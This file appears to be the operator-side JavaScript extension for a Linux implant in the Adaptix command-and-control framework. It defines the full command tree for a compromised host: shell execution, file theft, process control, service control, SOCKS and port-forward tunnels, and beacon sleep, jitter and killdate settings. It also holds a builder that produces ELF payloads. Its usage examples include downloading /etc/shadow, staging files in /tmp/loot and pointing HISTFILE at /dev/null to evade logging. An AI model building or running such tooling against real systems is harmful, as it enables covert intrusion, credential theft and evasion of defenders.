/// Jinxed Linux agent - operator client extension
///
/// Registers the "jinxed_linux" agent type with the Adaptix client: session
/// menus, file/process browsers, remote terminal, tunnels, download controls,
/// job controls and the full command tree. Every command below maps 1:1 to a
/// native POSIX implementation in src/agent and to a handler in the extender
/// (src/extender). Windows-only primitives (BOF, token impersonation, SMB/TCP
/// pivots, registry, WMI, injection) are intentionally absent.

/// ---------------------------------------------------------------------------
/// Session menus
/// ---------------------------------------------------------------------------

let terminate_process_action = menu.create_action("Terminate agent (process)", function(value) {
    value.forEach(v => ax.execute_command(v, "terminate process"))
});
let terminate_thread_action = menu.create_action("Terminate agent (graceful)", function(value) {
    value.forEach(v => ax.execute_command(v, "terminate thread"))
});
let exit_menu = menu.create_menu("Exit");
exit_menu.addItem(terminate_thread_action)
exit_menu.addItem(terminate_process_action)
menu.add_session_agent(exit_menu, ["jinxed_linux"])

let file_browser_action    = menu.create_action("File Browser",    function(value) { value.forEach(v => ax.open_browser_files(v)) });
let process_browser_action = menu.create_action("Process Browser", function(value) { value.forEach(v => ax.open_browser_process(v)) });
let terminal_action        = menu.create_action("Remote Terminal", function(value) { value.forEach(v => ax.open_remote_terminal(v)) });
menu.add_session_browser(file_browser_action, ["jinxed_linux"])
menu.add_session_browser(process_browser_action, ["jinxed_linux"])
menu.add_session_browser(terminal_action, ["jinxed_linux"])

let tunnel_access_action = menu.create_action("Create Tunnel", function(value) {
    ax.open_access_tunnel(value[0], true, true, true, true)
});
menu.add_session_access(tunnel_access_action, ["jinxed_linux"])

/// ---------------------------------------------------------------------------
/// File browser context actions
/// ---------------------------------------------------------------------------

let execute_action = menu.create_action("Execute", function(files_list) {
    let file = files_list[0];
    if (file.type != "file") { return; }

    let label_bin  = form.create_label("Binary:");
    let text_bin   = form.create_textline(file.path + file.name);
    text_bin.setEnabled(false);
    let label_args = form.create_label("Arguments:");
    let text_args  = form.create_textline();
    let output_check = form.create_check("Capture output");
    output_check.setChecked(true);

    let layout = form.create_gridlayout();
    layout.addWidget(label_bin,    0, 0, 1, 1);
    layout.addWidget(text_bin,     0, 1, 1, 1);
    layout.addWidget(label_args,   1, 0, 1, 1);
    layout.addWidget(text_args,    1, 1, 1, 1);
    layout.addWidget(output_check, 2, 1, 1, 1);

    let dialog = form.create_dialog("Execute binary");
    dialog.setSize(600, 100);
    dialog.setLayout(layout);
    if (dialog.exec() == true) {
        let command = "ps run ";
        if (output_check.isChecked()) { command += "-o "; }
        command += text_bin.text() + " " + text_args.text();
        ax.execute_command(file.agent_id, command);
    }
});

let download_action = menu.create_action("Download", function(files_list) {
    files_list.forEach((file) => {
        if (file.type == "file") {
            ax.execute_command(file.agent_id, "download " + file.path + file.name);
        }
    });
});

let remove_action = menu.create_action("Remove", function(files_list) {
    files_list.forEach(file => ax.execute_command(file.agent_id, "rm " + file.path + file.name))
});

let chmod_action = menu.create_action("Change mode", function(files_list) {
    let file = files_list[0];
    let label_mode = form.create_label("Octal mode:");
    let text_mode  = form.create_textline("0755");
    let layout = form.create_gridlayout();
    layout.addWidget(label_mode, 0, 0, 1, 1);
    layout.addWidget(text_mode,  0, 1, 1, 1);
    let dialog = form.create_dialog("Change file mode");
    dialog.setSize(360, 60);
    dialog.setLayout(layout);
    if (dialog.exec() == true) {
        ax.execute_command(file.agent_id, "chmod " + file.path + file.name + " " + text_mode.text());
    }
});

menu.add_filebrowser(execute_action,  ["jinxed_linux"])
menu.add_filebrowser(download_action, ["jinxed_linux"])
menu.add_filebrowser(chmod_action,    ["jinxed_linux"])
menu.add_filebrowser(remove_action,   ["jinxed_linux"])

let download_stop_action   = menu.create_action("Pause",  function(files_list) { files_list.forEach(file => ax.execute_command(file.agent_id, "exfil stop "   + file.file_id)) });
let download_start_action  = menu.create_action("Resume", function(files_list) { files_list.forEach(file => ax.execute_command(file.agent_id, "exfil start "  + file.file_id)) });
let download_cancel_action = menu.create_action("Cancel", function(files_list) { files_list.forEach(file => ax.execute_command(file.agent_id, "exfil cancel " + file.file_id)) });
menu.add_downloads_running(download_stop_action,   ["jinxed_linux"])
menu.add_downloads_running(download_start_action,  ["jinxed_linux"])
menu.add_downloads_running(download_cancel_action, ["jinxed_linux"])

let job_stop_action = menu.create_action("Stop job", function(tasks_list) {
    tasks_list.forEach((task) => {
        if (task.type == "JOB" && task.state == "Running") {
            ax.execute_command(task.agent_id, "jobs kill " + task.task_id);
        }
    });
});
menu.add_tasks_job(job_stop_action, ["jinxed_linux"])

/// ---------------------------------------------------------------------------
/// Browser events
/// ---------------------------------------------------------------------------

var event_files_action = function(id, path) {
    ax.execute_browser(id, "ls " + path);
}
event.on_filebrowser_list(event_files_action, ["jinxed_linux"]);

var event_upload_action = function(id, path, filepath) {
    let filename = ax.file_basename(filepath);
    ax.execute_browser(id, "upload " + filepath + " " + path + filename);
}
event.on_filebrowser_upload(event_upload_action, ["jinxed_linux"]);

var event_process_action = function(id) {
    ax.execute_browser(id, "ps list");
}
event.on_processbrowser_list(event_process_action, ["jinxed_linux"]);

/// ---------------------------------------------------------------------------
/// Command tree
/// ---------------------------------------------------------------------------

function RegisterCommands(listenerType)
{
    // --- filesystem -------------------------------------------------------
    let cmd_cat = ax.create_command("cat", "Read the first 2048 bytes of a file", "cat /etc/passwd", "Task: read file");
    cmd_cat.addArgString("path", true);

    let cmd_cd = ax.create_command("cd", "Change the current working directory", "cd /var/log", "Task: change working directory");
    cmd_cd.addArgString("path", true);

    let cmd_cp = ax.create_command("cp", "Copy a file", "cp /tmp/a /tmp/b", "Task: copy file");
    cmd_cp.addArgString("src", true);
    cmd_cp.addArgString("dst", true);

    let cmd_disks = ax.create_command("disks", "List mounted filesystems with capacity", "disks", "Task: show mounted filesystems");

    let cmd_download = ax.create_command("download", "Download a file", "download /etc/shadow", "Task: download file");
    cmd_download.addArgString("file", true);

    let _cmd_exfil_cancel = ax.create_command("cancel", "Cancel an in-progress download", "exfil cancel 1a2b3c4d");
    _cmd_exfil_cancel.addArgString("file_id", true);
    let _cmd_exfil_start = ax.create_command("start", "Resume a paused download", "exfil start 1a2b3c4d");
    _cmd_exfil_start.addArgString("file_id", true);
    let _cmd_exfil_stop = ax.create_command("stop", "Pause an in-progress download", "exfil stop 1a2b3c4d");
    _cmd_exfil_stop.addArgString("file_id", true);
    let cmd_exfil = ax.create_command("exfil", "Manage current downloads");
    cmd_exfil.addSubCommands([_cmd_exfil_cancel, _cmd_exfil_start, _cmd_exfil_stop])

    let cmd_ls = ax.create_command("ls", "List a directory or a single file", "ls /home", "Task: list files");
    cmd_ls.addArgString("path", "", ".");

    let cmd_mv = ax.create_command("mv", "Move or rename a file", "mv /tmp/a /tmp/b", "Task: move file");
    cmd_mv.addArgString("src", true);
    cmd_mv.addArgString("dst", true);

    let cmd_mkdir = ax.create_command("mkdir", "Create a directory (parents included)", "mkdir /tmp/loot", "Task: make directory");
    cmd_mkdir.addArgString("path", true);

    let cmd_pwd = ax.create_command("pwd", "Print the current working directory", "pwd", "Task: print working directory");

    let cmd_rm = ax.create_command("rm", "Remove a file or directory tree", "rm /tmp/loot", "Task: remove file or directory");
    cmd_rm.addArgString("path", true);

    let cmd_chmod = ax.create_command("chmod", "Change POSIX permissions", "chmod /tmp/x 0755", "Task: change file mode");
    cmd_chmod.addArgString("path", true);
    cmd_chmod.addArgString("mode", true, "Octal mode, e.g. 0755");

    let cmd_upload = ax.create_command("upload", "Upload a file", "upload /tmp/local.sh /tmp/remote.sh", "Task: upload file");
    cmd_upload.addArgFile("local_file", true);
    cmd_upload.addArgString("remote_path", false);

    // --- execution --------------------------------------------------------
    let _cmd_ps_list = ax.create_command("list", "Show the process list", "ps list", "Task: show process list");
    let _cmd_ps_kill = ax.create_command("kill", "Kill a process by PID", "ps kill 4242", "Task: kill process");
    _cmd_ps_kill.addArgInt("pid", true);
    let _cmd_ps_run = ax.create_command("run", "Run a program", "run -o /bin/uname -a", "Task: create new process");
    _cmd_ps_run.addArgBool("-s", "Start stopped (not supported by POSIX)");
    _cmd_ps_run.addArgBool("-o", "Capture output");
    _cmd_ps_run.addArgBool("-i", "Use impersonation (not supported by POSIX)");
    _cmd_ps_run.addArgString("args", true);
    let cmd_ps = ax.create_command("ps", "Process manager");
    cmd_ps.addSubCommands([_cmd_ps_list, _cmd_ps_kill, _cmd_ps_run]);

    let cmd_shell = ax.create_command("shell", "Execute a command via /bin/sh -c", "shell id; uname -a", "Task: execute command");
    cmd_shell.addArgString("cmd_params", true);

    let _cmd_job_list = ax.create_command("list", "List running jobs", "jobs list", "Task: show jobs");
    let _cmd_job_kill = ax.create_command("kill", "Kill a job", "jobs kill 1a2b3c4d", "Task: kill job");
    _cmd_job_kill.addArgString("task_id", true);
    let cmd_job = ax.create_command("jobs", "Long-running task manager");
    cmd_job.addSubCommands([_cmd_job_list, _cmd_job_kill]);

    // --- session ----------------------------------------------------------
    let cmd_getuid = ax.create_command("getuid", "Print the current user identity", "getuid", "Task: get current user");

    let cmd_sysinfo = ax.create_command("sysinfo", "Report host, kernel, memory and container metadata", "sysinfo", "Task: host information");
    let cmd_uname = ax.create_command("uname", "Print kernel identification", "uname", "Task: uname");
    let cmd_users = ax.create_command("users", "List currently logged in users", "users", "Task: list users");
    let cmd_ifconfig = ax.create_command("ifconfig", "List network interfaces and addresses", "ifconfig", "Task: list interfaces");
    let cmd_netstat = ax.create_command("netstat", "List TCP/UDP sockets from /proc", "netstat", "Task: list sockets");

    let _cmd_env_list = ax.create_command("list", "List all environment variables", "env list");
    let _cmd_env_get = ax.create_command("get", "Read one environment variable", "env get PATH");
    _cmd_env_get.addArgString("name", true);
    let _cmd_env_set = ax.create_command("set", "Set an environment variable for the agent process", "env set HISTFILE /dev/null");
    _cmd_env_set.addArgString("name", true);
    _cmd_env_set.addArgString("value", true);
    let _cmd_env_unset = ax.create_command("unset", "Unset an environment variable", "env unset HISTFILE");
    _cmd_env_unset.addArgString("name", true);
    let cmd_env = ax.create_command("env", "Environment variable manager");
    cmd_env.addSubCommands([_cmd_env_list, _cmd_env_get, _cmd_env_set, _cmd_env_unset]);

    let _cmd_service_list = ax.create_command("list", "List systemd services", "service list");
    let _cmd_service_status = ax.create_command("status", "Show service status", "service status ssh");
    _cmd_service_status.addArgString("unit", true);
    let _cmd_service_start = ax.create_command("start", "Start a service", "service start ssh");
    _cmd_service_start.addArgString("unit", true);
    let _cmd_service_stop = ax.create_command("stop", "Stop a service", "service stop ssh");
    _cmd_service_stop.addArgString("unit", true);
    let _cmd_service_restart = ax.create_command("restart", "Restart a service", "service restart ssh");
    _cmd_service_restart.addArgString("unit", true);
    let _cmd_service_enable = ax.create_command("enable", "Enable a service at boot", "service enable ssh");
    _cmd_service_enable.addArgString("unit", true);
    let _cmd_service_disable = ax.create_command("disable", "Disable a service at boot", "service disable ssh");
    _cmd_service_disable.addArgString("unit", true);
    let cmd_service = ax.create_command("service", "systemd/SysV service control");
    cmd_service.addSubCommands([_cmd_service_list, _cmd_service_status, _cmd_service_start,
        _cmd_service_stop, _cmd_service_restart, _cmd_service_enable, _cmd_service_disable]);

    let cmd_sleep = ax.create_command("sleep", "Set the beacon interval", "sleep 30m5s 10");
    cmd_sleep.addArgString("sleep", true, "Time in '%h%m%s' format or number of seconds");
    cmd_sleep.addArgInt("jitter", false, "Max random amount of time in % added to sleep");

    let _cmd_profile_chunksize = ax.create_command("download.chunksize", "Change the download chunk size", "profile download.chunksize 262144", "Task: set download chunk size");
    _cmd_profile_chunksize.addArgInt("size", true);
    let _cmd_profile_killdate = ax.create_command("killdate", "Set the date and time when the agent stops", "profile killdate 28.02.2030 12:34:00", "Task: set killdate");
    _cmd_profile_killdate.addArgString("datetime", true, "Datetime 'DD.MM.YYYY hh:mm:ss' in GMT. Use 0 to disable");
    let _cmd_profile_workingtime = ax.create_command("workingtime", "Set the daily activity window", "profile workingtime 8:00-17:30", "Task: set workingtime");
    _cmd_profile_workingtime.addArgString("time", true, "Format 'HH:mm-HH:mm'. Use 0 to disable");
    let cmd_profile = ax.create_command("profile", "Configure the session profile");
    cmd_profile.addSubCommands([_cmd_profile_chunksize, _cmd_profile_killdate, _cmd_profile_workingtime]);

    let _cmd_terminate_thread = ax.create_command("thread", "Stop the agent loop without killing the process", "terminate thread", "Task: terminate agent thread");
    let _cmd_terminate_process = ax.create_command("process", "Terminate the agent process", "terminate process", "Task: terminate agent process");
    let cmd_terminate = ax.create_command("terminate", "Terminate the session");
    cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);

    // --- tunnels ----------------------------------------------------------
    let _cmd_socks_start = ax.create_command("start", "Start a SOCKS4a/SOCKS5 proxy on the teamserver", "socks start 1080 -auth user pass");
    _cmd_socks_start.addArgFlagString("-h", "address", "Listening interface address on the teamserver", "0.0.0.0");
    _cmd_socks_start.addArgInt("port", true, "Listen port");
    _cmd_socks_start.addArgBool("-socks4", "Use SOCKS4 instead of SOCKS5");
    _cmd_socks_start.addArgBool("-auth", "Enable username/password authentication (SOCKS5)");
    _cmd_socks_start.addArgString("username", false, "Username for the SOCKS5 proxy");
    _cmd_socks_start.addArgString("password", false, "Password for the SOCKS5 proxy");
    let _cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy", "socks stop 1080");
    _cmd_socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "Manage SOCKS tunnels");
    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);

    let _cmd_lportfwd_start = ax.create_command("start", "Forward a teamserver port through the agent", "lportfwd start 127.0.0.1 8080 10.10.10.5 80");
    _cmd_lportfwd_start.addArgString("lhost", "Listening interface address on the teamserver", "0.0.0.0");
    _cmd_lportfwd_start.addArgInt("lport", true, "Listen port on the teamserver");
    _cmd_lportfwd_start.addArgString("fwdhost", true, "Target host reachable from the agent");
    _cmd_lportfwd_start.addArgInt("fwdport", true, "Target port");
    let _cmd_lportfwd_stop = ax.create_command("stop", "Stop a local port forward", "lportfwd stop 8080");
    _cmd_lportfwd_stop.addArgInt("lport", true);
    let cmd_lportfwd = ax.create_command("lportfwd", "Manage local port forwarding");
    cmd_lportfwd.addSubCommands([_cmd_lportfwd_start, _cmd_lportfwd_stop]);

    let _cmd_rportfwd_start = ax.create_command("start", "Listen on the agent and forward through the teamserver", "rportfwd start 4444 127.0.0.1 22");
    _cmd_rportfwd_start.addArgInt("lport", true, "Listen port on the agent");
    _cmd_rportfwd_start.addArgString("fwdhost", true, "Target host reachable from the teamserver");
    _cmd_rportfwd_start.addArgInt("fwdport", true, "Target port");
    let _cmd_rportfwd_stop = ax.create_command("stop", "Stop a reverse port forward", "rportfwd stop 4444");
    _cmd_rportfwd_stop.addArgInt("lport", true);
    let cmd_rportfwd = ax.create_command("rportfwd", "Manage reverse port forwarding");
    cmd_rportfwd.addSubCommands([_cmd_rportfwd_start, _cmd_rportfwd_stop]);

    // --- aliases ----------------------------------------------------------
    let cmd_interact = ax.create_command("interact", "Set 'sleep 0' for interactive operation", "interact");
    cmd_interact.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
        ax.execute_alias(id, cmdline, "sleep 0");
    });

    let commands_linux = ax.create_commands_group("jinxed_linux", [
        cmd_cat, cmd_cd, cmd_cp, cmd_disks, cmd_download, cmd_exfil,
        cmd_ls, cmd_mv, cmd_mkdir, cmd_pwd, cmd_rm, cmd_chmod, cmd_upload,
        cmd_ps, cmd_shell, cmd_job,
        cmd_getuid, cmd_sysinfo, cmd_uname, cmd_users, cmd_ifconfig, cmd_netstat,
        cmd_env, cmd_service,
        cmd_sleep, cmd_profile, cmd_terminate,
        cmd_socks, cmd_lportfwd, cmd_rportfwd,
        cmd_interact
    ]);

    return { commands_linux: commands_linux }
}

/// ---------------------------------------------------------------------------
/// Payload builder UI
/// ---------------------------------------------------------------------------

function GenerateUI(listeners_type)
{
    let labelArch = form.create_label("Arch:");
    let comboArch = form.create_combo();
    comboArch.addItems(["amd64", "arm64", "386", "arm"]);

    let labelFormat = form.create_label("Format:");
    let comboFormat = form.create_combo();
    comboFormat.addItems(["ELF"]);

    let labelSleep = form.create_label("Sleep (Jitter %):");
    let textSleep = form.create_textline("10s");
    textSleep.setPlaceholder("1h 2m 5s");
    let spinJitter = form.create_spin();
    spinJitter.setRange(0, 100);
    spinJitter.setValue(10);

    let checkKilldate = form.create_check("Set 'killdate'");
    let dateKill = form.create_dateline("dd.MM.yyyy");
    let timeKill = form.create_timeline("HH:mm:ss");

    let checkWorkingTime = form.create_check("Set 'workingtime'");
    let timeStart  = form.create_timeline("HH:mm");
    let timeFinish = form.create_timeline("HH:mm");

    let checkDebug = form.create_check("Keep debug symbols (larger payload)");

    let spacer1 = form.create_vspacer();

    let layout = form.create_gridlayout();
    layout.addWidget(spacer1,          0, 0, 1, 3);
    layout.addWidget(labelArch,        1, 0, 1, 1);
    layout.addWidget(comboArch,        1, 1, 1, 2);
    layout.addWidget(labelFormat,      2, 0, 1, 1);
    layout.addWidget(comboFormat,      2, 1, 1, 2);
    layout.addWidget(labelSleep,       3, 0, 1, 1);
    layout.addWidget(textSleep,        3, 1, 1, 1);
    layout.addWidget(spinJitter,       3, 2, 1, 1);
    layout.addWidget(checkKilldate,    4, 0, 1, 1);
    layout.addWidget(dateKill,         4, 1, 1, 1);
    layout.addWidget(timeKill,         4, 2, 1, 1);
    layout.addWidget(checkWorkingTime, 5, 0, 1, 1);
    layout.addWidget(timeStart,        5, 1, 1, 1);
    layout.addWidget(timeFinish,       5, 2, 1, 1);
    layout.addWidget(checkDebug,       6, 0, 1, 3);

    let container = form.create_container();
    container.put("arch",            comboArch);
    container.put("format",          comboFormat);
    container.put("sleep",           textSleep);
    container.put("jitter",          spinJitter);
    container.put("is_killdate",     checkKilldate);
    container.put("kill_date",       dateKill);
    container.put("kill_time",       timeKill);
    container.put("is_workingtime",  checkWorkingTime);
    container.put("start_time",      timeStart);
    container.put("end_time",        timeFinish);
    container.put("debug",           checkDebug);

    let panel = form.create_panel();
    panel.setLayout(layout);

    return {
        ui_panel:     panel,
        ui_container: container,
        ui_height:    320,
        ui_width:     480
    }
}
